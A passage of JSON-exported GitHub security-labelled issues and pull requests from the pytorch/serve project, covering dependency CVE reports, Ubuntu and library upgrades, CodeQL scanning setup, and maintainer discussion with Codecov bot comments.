src=\"https://api.segment.io/v1/pixel/track?data=eyJ3cml0ZUtleSI6InJyWmxZcEdHY2RyTHZsb0lYd0dUcVg4WkFRTnNCOUEwIiwiYW5vbnltb3VzSWQiOiIyNDgwMjEzNS1lNDVmLTQ3MjQtYjk2Ny0yMzZlODA5MjZkYjEiLCJldmVudCI6IlBSIHZpZXdlZCIsInByb3BlcnRpZXMiOnsicHJJZCI6IjI0ODAyMTM1LWU0NWYtNDcyNC1iOTY3LTIzNmU4MDkyNmRiMSJ9fQ==\" width=\"0\" height=\"0\"/>\n🧐 [View latest project report](https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr)\n\n🛠 [Adjust project settings](https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr/settings)\n\n[//]: # 'snyk:metadata:{\"prId\":\"24802135-e45f-4724-b967-236e80926db1\",\"prPublicId\":\"24802135-e45f-4724-b967-236e80926db1\",\"dependencies\":[{\"name\":\"ubuntu\",\"from\":\"rolling\",\"to\":\"22.10\"}],\"packageManager\":\"dockerfile\",\"projectPublicId\":\"ad8cdeca-1810-450c-b930-16863a307899\",\"projectUrl\":\"https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source=github&utm_medium=referral&page=fix-pr\",\"type\":\"auto\",\"patch\":[],\"vulns\":[\"SNYK-UBUNTU2210-TAR-3261142\",\"SNYK-UBUNTU2210-GNUTLS28-3319585\",\"SNYK-UBUNTU2210-SYSTEMD-3148007\",\"SNYK-UBUNTU2210-SYSTEMD-3180315\"],\"upgrade\":[\"SNYK-UBUNTU2210-GNUTLS28-3319585\",\"SNYK-UBUNTU2210-SYSTEMD-3148007\",\"SNYK-UBUNTU2210-SYSTEMD-3148007\",\"SNYK-UBUNTU2210-SYSTEMD-3180315\",\"SNYK-UBUNTU2210-TAR-3261142\"],\"isBreakingChange\":false,\"env\":\"prod\",\"prType\":\"fix\",\"templateVariants\":[\"updated-fix-title\"],\"priorityScoreList\":[null,null,null,null],\"remediationStrategy\":\"vuln\"}'\n\n---\n\n**Learn how to fix vulnerabilities with free interactive lessons:**\n\n 🦉 [Resource Exhaustion](https://learn.snyk.io/lessons/redos/javascript/?loc&#x3D;fix-pr)\n",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2239?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2239](https://app.codecov.io/gh/pytorch/serve/pull/2239?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (37d686d) into [master](https://app.codecov.io/gh/pytorch/serve/commit/754c2f9a550ff57790e586c199dc8b7a842af159?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (754c2f9) will **increase** coverage by `0.08%`.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 37d686d differs from pull request most recent head 9243cf4. Consider uploading reports for the commit 9243cf4 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2239      +/-   ##\n==========================================\n+ Coverage   71.81%   71.89%   +0.08%     \n==========================================\n  Files          78       78              \n  Lines        3654     3654              \n  Branches       58       58              \n==========================================\n+ Hits         2624     2627       +3     \n+ Misses       1026     1023       -3     \n  Partials        4        4              \n```\n\n\n[see 1 file with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2239/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-18T19:33:36Z",
                        "url": "https://github.com/pytorch/serve/pull/2239#issuecomment-1513693165"
                    },
                    {
                        "body": "This doesnt feel that important",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-07-21T21:59:13Z",
                        "url": "https://github.com/pytorch/serve/pull/2239#issuecomment-1646277295"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2239",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2178",
                "title": "Java Security Vulnerabilities",
                "labels": [
                    "security"
                ],
                "user": "Nickleha",
                "issue_author_association": "NONE",
                "number": 2178,
                "id": 1622505798,
                "state": "closed",
                "project_created_at": "2023-03-14T00:20:14Z",
                "closed_at": "2023-10-28T19:40:13Z",
                "body": "### 🐛 Describe the bug\n\nThere are a few outdated Java packages throughout the repo that have open high severity CVE's. There's a large number of mediums and below, but since pretty much nobody blocks deployment for those I'm not too concerned. \r\n\r\n\r\n\r\nNetty currently defined in frontend gradle.properties would need to be incremented to 4.1.86.Final \r\n\r\nThe jackson databind vulnerabilities are due to dependencies from the core log4j package (also defined in the frontend gradle.properties). 2.20.0 is the first update that closes all of those by incrementing the databind version up to 2.14.\r\n\r\nTestng also defined in frontend gradle to version 7.1.0 (though prisma is picking up a version at 6.3.0?), but all versions < 7.7.0 have the same vulnerability for testngXmlExistsInJar.\r\n\r\nI'm actually having trouble pinning down how com.amazonaws_aws-java-sdk-s3 gets installed at version 1.11.948. My best guess is that it's installed as part of the DBEEndpoint gradle build, where com.amazonaws:DynamoDBLocal:1.13.2 requires com.amazonaws:aws-java-sdk-dynamodb:1.11.780 which requires the s3 package in question. That version required is [1.11.780](https://mvnrepository.com/artifact/com.amazonaws/aws-java-sdk-s3/1.11.780) while 1.11.948 is what's ultimately in the image. \r\n\r\nThe two packages with mismatches between where I can find versions and what I see in the final image make me think that I don't fully understand all the ways they're installed and used though. \r\n\n\n### Error logs\n\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n|      CVE       | SEVERITY | CVSS |                   PACKAGE                   |   VERSION    |      STATUS       |  PUBLISHED  | DISCOVERED | GRACE DAYS |                    DESCRIPTION                     |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-42004 | high     | 7.50 | com.fasterxml.jackson.core_jackson-databind | 2.13.3       | fixed in 2.13.4   | > 5 months  | < 1 hour   | -117       | In FasterXML jackson-databind before 2.13.4,       |\r\n|                |          |      |                                             |              | > 5 months ago    |             |            |            | resource exhaustion can occur because of a lack of |\r\n|                |          |      |                                             |              |                   |             |            |            | a check in BeanDeserializer._deserializeFromArray  |\r\n|                |          |      |                                             |              |                   |             |            |            | to p...                                            |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-42003 | high     | 7.50 | com.fasterxml.jackson.core_jackson-databind | 2.13.3       | fixed in 2.14.0   | > 5 months  | < 1 hour   | -117       | In FasterXML jackson-databind before 2.14.0-rc1,   |\r\n|                |          |      |                                             |              | > 5 months ago    |             |            |            | resource exhaustion can occur because of a lack of |\r\n|                |          |      |                                             |              |                   |             |            |            | a check in primitive value deserializers to avoid  |\r\n|                |          |      |                                             |              |                   |             |            |            | ...                                                |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-41881 | high     | 7.50 | io.netty_netty-all                          | 4.1.53.Final | fixed in 4.1.86   | > 3 months  | < 1 hour   | -39        | Netty project is an event-driven asynchronous      |\r\n|                |          |      |                                             |              | 83 days ago       |             |            |            | network application framework. In versions prior   |\r\n|                |          |      |                                             |              |                   |             |            |            | to 4.1.86.Final, a StackOverflowError can be       |\r\n|                |          |      |                                             |              |                   |             |            |            | raised whe...                                      |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2021-37137 | high     | 7.50 | io.netty_netty-all                          | 4.1.53.Final | fixed in 4.1.68   | > 1 years   | < 1 hour   | -465       | The Snappy frame decoder function doesn\\t         |\r\n|                |          |      |                                             |              | > 1 years ago     |             |            |            | restrict the chunk length which may lead to        |\r\n|                |          |      |                                             |              |                   |             |            |            | excessive memory usage. Beside this it also may    |\r\n|                |          |      |                                             |              |                   |             |            |            | buffer reserved...                                 |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2021-37136 | high     | 7.50 | io.netty_netty-all                          | 4.1.53.Final | fixed in 4.1.68   | > 1 years   | < 1 hour   | -465       | The Bzip2 decompression decoder function           |\r\n|                |          |      |                                             |              | > 1 years ago     |             |            |            | doesn\\t allow setting size restrictions on        |\r\n|                |          |      |                                             |              |                   |             |            |            | the decompressed output data (which affects the    |\r\n|                |          |      |                                             |              |                   |             |            |            | allocation size u...                               |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-4065  | high     | 7.00 | org.testng_testng                           | 6.3.1        | fixed in 7.7.0    | > 3 months  | < 1 hour   | -9         | A vulnerability was found in cbeust testng. It     |\r\n|                |          |      |                                             |              | 53 days ago       |             |            |            | has been declared as critical. Affected by this    |\r\n|                |          |      |                                             |              |                   |             |            |            | vulnerability is the function testngXmlExistsInJar |\r\n|                |          |      |                                             |              |                   |             |            |            | of t...                                            |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-31159 | high     | 7.00 | com.amazonaws_aws-java-sdk-s3               | 1.11.948     | fixed in 1.12.261 | > 8 months  | < 1 hour   | -196       | The AWS SDK for Java enables Java developers       |\r\n|                |          |      |                                             |              | > 8 months ago    |             |            |            | to work with Amazon Web Services. A                |\r\n|                |          |      |                                             |              |                   |             |            |            | partial-path traversal issue exists within the     |\r\n|                |          |      |                                             |              |                   |             |            |            | `downloadDirectory` me...       \n\n### Installation instructions\n\nFailing packages present when scanning torchserve:latest and torchserve-nightly:latest-cpu with prisma. I am not sure how to check full snyk results. \n\n### Model Packaing\n\nn/a\n\n### config.properties\n\nn/a\n\n### Versions\n\nall current versions from base image for 0.7.1 release with no modifications\n\n### Repro instructions\n\nn/a\n\n### Possible Solution\n\nIn frontend gradle.properties increment  netty_version to 4.1.86.Final and slf4j_log4j_version to 2.20.0.\r\n\r\nThe other vulnerabilities i'm not positive on how to manage the versions. \r\nFor org.testng_testng, there's already an older version that exists somewhere in the image, so I think there's a way installs are managed that I don't understand.\r\nFor com.amazonaws_aws-java-sdk-s3, does it makes sense that the package i'm finding is ultimately due to the DDBEndPoint installation? \r\n\r\nI'm not sure what makes it into the dockerhub images versus what is only built for dev purposes for for running the regression suite, which means I may misunderstand the best way to solve these. \r\n\r\n",
                "comments": [
                    {
                        "body": "Absolutely, this version of log4j and a few other packages is worrisome. Would love if something could be done about it.",
                        "user": "0-zen",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-16T21:52:47Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1472797446"
                    },
                    {
                        "body": "In between other work tasks I'm setting up a way to build and test against our implementation of prisma. Once I have an easy way to fiddle with versions, test build still works correctly, and make sure they resolve all the java package related vulnerabilities, I can make a PR off a bug fix branch with the version incrs.",
                        "user": "Nickleha",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-16T22:38:45Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1472855459"
                    },
                    {
                        "body": "@msaroufim Earlier info I dropped in the bug report isn't right. The only problem package of the ones I listed that is actually defined in gradle.properties is netty, the others are due to gradle plugins. Just an FYI that any solution has to have both changed, but I also wanted to double check if upgrading our gradle version throws any sanity check red flags for anybody (build --scan already shows which possible deprecated functions I'd need to change with it).",
                        "user": "Nickleha",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-21T19:25:23Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1478463083"
                    },
                    {
                        "body": "We are now updating dependencies on a monthly basis with dependabot",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-28T19:40:13Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1783906237"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2150",
                "title": "Upgrade to ubuntu22.04 to fix security issues.",
                "labels": [
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2150,
                "id": 1593683987,
                "state": "closed",
                "project_created_at": "2023-02-21T15:31:35Z",
                "closed_at": "2023-06-26T12:09:29Z",
                "body": "There're still many security issues on ubuntu20.04, in order to improve the security, need upgrade to ubuntu 22.04.\r\n\r\nubuntu22.04 is only available for cu117 as nvidia/cuda only provide ubuntu22.04 for cu117 or above.\r\n\r\nbelow is an example of security issues.\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/220387875-1a5dcd32-7401-4ab9-ac3a-a66ffbac4217.png)\r\n\r\n\r\nFixes #(issue)\r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [ ] Bug fix (non-breaking change which fixes an issue)\r\n- [ ] New feature (non-breaking change which adds functionality)\r\n- [ ] This change requires a documentation update\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [ ] regression testing\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/220388150-eb01a77c-1c87-4c83-b5f4-bb03d88ff7a6.png)\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/220388213-117f09b1-aec3-44dc-b98c-521dda8cb9b2.png)\r\n\r\n\r\n## Checklist:\r\n\r\n- [ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2150?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2150](https://codecov.io/gh/pytorch/serve/pull/2150?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (b931925) into [master](https://codecov.io/gh/pytorch/serve/commit/c417b4a03ba9be315090464de76893304361f9e1?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c417b4a) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head b931925 differs from pull request most recent head 0dc29d9. Consider uploading reports for the commit 0dc29d9 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2150   +/-   ##\n=======================================\n  Coverage   53.36%   53.36%           \n=======================================\n  Files          71       71           \n  Lines        3225     3225           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1504     1504           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-02-21T16:12:37Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1438745541"
                    },
                    {
                        "body": "We encountered a lot of flakiness on our ubuntu CI when we moved from 18.04 to 22.04 or 20.04. This is an issue because I'd rather we use the same Ubuntu version everywhere so both for the docker files and anything under `.github/workflows` otherwise there's always a chance that a small dependency change breaks everything.\r\n\r\nAlso I'm still not sure what our policy should be for medium or low impact security issues, my worry is we'd spend too much time upgrading dependencies as opposed to focusing on the bigger security issues",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-02-21T17:42:55Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1438870606"
                    },
                    {
                        "body": "we have very strict security policy, medium issues should be fixed as far as possible.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-02-22T03:15:36Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1439379519"
                    },
                    {
                        "body": "Hi @jack-gits do you mind emailing me? It's my firstnamelastname@meta.com - since security is obviously important to you, I'd rather we discuss things in more depth there",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-02-22T03:20:05Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1439382680"
                    },
                    {
                        "body": "> \r\n\r\nhave you got my email by jackxu081@gmail.com?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-03-04T05:01:53Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1454440663"
                    },
                    {
                        "body": "I believe I missed your original, email just emailed you now",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-03-04T22:18:42Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1454905045"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2150",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2149",
                "title": "Add Github Code Scanning codeql.yml",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2149,
                "id": 1592303241,
                "state": "closed",
                "project_created_at": "2023-02-20T18:35:20Z",
                "closed_at": "2023-02-21T17:29:59Z",
                "body": "## Description\r\n\r\nThis PR adds support for code scanning which detects a large suite of common vulnerabilities like code injection, directory traversal, bad crypto algorithms\r\n\r\nSo now our security process includes\r\n1. Dependency analysis with dependabot\r\n2. Code scanning (this PR)\r\n3. Docker scanning (Snyk, already added in 0.7.1)\r\n\r\nMight also be useful to do\r\n1. Penetration testing on a deployed instance - maybe @agunapal is interested in this\r\n2. An Audit - I'll look into this\r\n\r\nThe security issues will show up in https://github.com/pytorch/serve/security/code-scanning after this is merged\r\n\r\n## Type of change\r\n\r\n\r\n- [x] New feature (non-breaking change which adds functionality)\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [x] Test A\r\n\r\nScroll down to CI, there should be 2 new jobs for code scanning, one for python and one for java\r\n\r\nWhen both those jobs get completed a report gets created and it accurately shows some existing vulnerabilities we need to be fixing https://github.com/pytorch/serve/pull/2149/checks?check_run_id=11473788403\r\n\r\n\r\n## Checklist:\r\n\r\n- [x] Did you have fun?\r\n- [x] Have you added tests that prove your fix is effective or that this feature works?\r\n- [x] Has code been commented, particularly in hard-to-understand areas?\r\n\r\n\r\n",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2149?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2149](https://codecov.io/gh/pytorch/serve/pull/2149?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (330273f) into [master](https://codecov.io/gh/pytorch/serve/commit/c417b4a03ba9be315090464de76893304361f9e1?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c417b4a) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 330273f differs from pull request most recent head aa02933. Consider uploading reports for the commit aa02933 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2149   +/-   ##\n=======================================\n  Coverage   53.36%   53.36%           \n=======================================\n  Files          71       71           \n  Lines        3225     3225           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1504     1504           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-02-20T18:56:43Z",
                        "url": "https://github.com/pytorch/serve/pull/2149#issuecomment-1437431296"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2149",
                    "merged_at": "2023-02-21T17:29:59Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2081",
                "title": "Update to safe snakeyaml,  grpc and gradle",
                "labels": [
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2081,
                "id": 1538260965,
                "state": "closed",
                "project_created_at": "2023-01-18T16:00:19Z",
                "closed_at": "2023-01-18T21:26:11Z",
                "body": "## Description\r\n\r\nfix some security issues found in 0.7.0 as followings:\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/213219859-04e44196-50e4-4587-bf97-b8528040f519.png)\r\n\r\n\r\nFixes #([issue](https://github.com/pytorch/serve/issues/2042))\r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [ ] Bug fix (non-breaking change which fixes an issue)\r\n\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [ ] Regression testing\r\n![image](https://user-images.githubusercontent.com/30545972/213222828-1d34ed45-6e8c-4536-be07-3841725a7d84.png)\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/213223200-55af5604-91c2-49ea-a259-226216b73b41.png)\r\n\r\n\r\n\r\n## Checklist:\r\n\r\n- [ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "@jack-gits I just changed the title, if you make further changes please update the title correspondingly. It helps make sure we can credit you in the release notes",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-18T17:40:56Z",
                        "url": "https://github.com/pytorch/serve/pull/2081#issuecomment-1387465600"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2081?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2081](https://codecov.io/gh/pytorch/serve/pull/2081?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c96d783) into [master](https://codecov.io/gh/pytorch/serve/commit/79241145ff9e14a66d1260bdf284d2348db5da12?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (7924114) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2081   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-18T18:09:29Z",
                        "url": "https://github.com/pytorch/serve/pull/2081#issuecomment-1387498778"
                    },
                    {
                        "body": "when will it be released?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-02-06T02:41:41Z",
                        "url": "https://github.com/pytorch/serve/pull/2081#issuecomment-1418421223"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2081",
                    "merged_at": "2023-01-18T21:26:11Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2078",
                "title": "Upgrade to  PyTorch 1.13.1",
                "labels": [
                    "security"
                ],
                "user": "agunapal",
                "issue_author_association": "COLLABORATOR",
                "number": 2078,
                "id": 1532736196,
                "state": "closed",
                "project_created_at": "2023-01-13T18:25:36Z",
                "closed_at": "2023-01-17T17:12:06Z",
                "body": "## Description\r\n\r\nUpgrade PyTorch to version 1.13.1\r\n\r\nFixes #(issue)\r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [ ] Bug fix (non-breaking change which fixes an issue)\r\n- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)\r\n- [x] New feature (non-breaking change which adds functionality)\r\n- [ ] This change requires a documentation update\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n[1_regression-gpu (cu116).txt](https://github.com/pytorch/serve/files/10414380/1_regression-gpu.cu116.txt)\r\n[2_regression-gpu (cu117).txt](https://github.com/pytorch/serve/files/10414382/2_regression-gpu.cu117.txt)\r\n[1_regression-cpu (ubuntu-20.04).txt](https://github.com/pytorch/serve/files/10414383/1_regression-cpu.ubuntu-20.04.txt)\r\n[2_regression-cpu (macOS-latest).txt](https://github.com/pytorch/serve/files/10414384/2_regression-cpu.macOS-latest.txt)\r\n\r\n\r\n\r\n\r\n## Checklist:\r\n\r\n- [ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "Interesting that this all crashed here https://github.com/pytorch/serve/pull/2074 but CI here seems to have passed",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-13T19:01:01Z",
                        "url": "https://github.com/pytorch/serve/pull/2078#issuecomment-1382256190"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2078?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2078](https://codecov.io/gh/pytorch/serve/pull/2078?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (3be380c) into [master](https://codecov.io/gh/pytorch/serve/commit/8c11091ebf616e00e23657682f47c5233b246778?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (8c11091) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2078   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-13T19:05:51Z",
                        "url": "https://github.com/pytorch/serve/pull/2078#issuecomment-1382261522"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2078",
                    "merged_at": "2023-01-17T17:12:06Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2069",
                "title": "[Snyk] Upgrade com.google.code.gson:gson from 2.9.0 to 2.10",
                "labels": [
                    "security"
                ],
                "user": "snyk-bot",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2069,
                "id": 1529873583,
                "state": "closed",
                "project_created_at": "2023-01-11T23:40:12Z",
                "closed_at": "2023-01-13T00:31:10Z",
